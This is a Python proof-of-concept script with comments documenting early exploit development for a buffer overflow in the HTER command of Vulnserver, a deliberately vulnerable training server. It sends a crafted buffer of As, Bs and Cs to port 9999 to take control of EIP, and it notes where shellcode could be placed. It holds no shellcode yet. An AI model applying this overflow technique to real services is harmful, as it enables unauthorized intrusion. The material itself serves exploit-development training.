#########################################################################################
# Title: Vulnserver HTER command exploit
# Author: Marco Lugo
# Description: by sniffing network traffic and by looking at the Spike logs, we found
#              that the crash was caused by a buffer of 2050 As. Curiously, EIP was
#              not overwritten by 4 41s but by one zero and 7 As which leads us to believe
#              that (1) the buffer ascii overwrites as-is (i.e. ASCII is transformed into
#              HEX equivalent before overflow) and (2) that there is one character missing
#              in the buffer in order to fully overwrite EIP with As. (2) is confirmed here
#              as we are able to overwrite with exactly 8 Bs. We also observed that at
#              the time of the crash, ESP points to the Cs (we have 1000) and EAX to the As (2000+).
#              Many options are thus available, such as injecting the full shellcode in the
#              C segment or using the C segment to jump to the A segment, it depends on what we
#              can jump to.
#
#              We still have to  confirm what the encoding mechanism is for Bs to show up instead of 42s.
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os

target_ip = sys.argv[1]
buffer = 'HTER '
pattern = 'A' * 2041 + 'B' *8 + 'C' * 1000
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


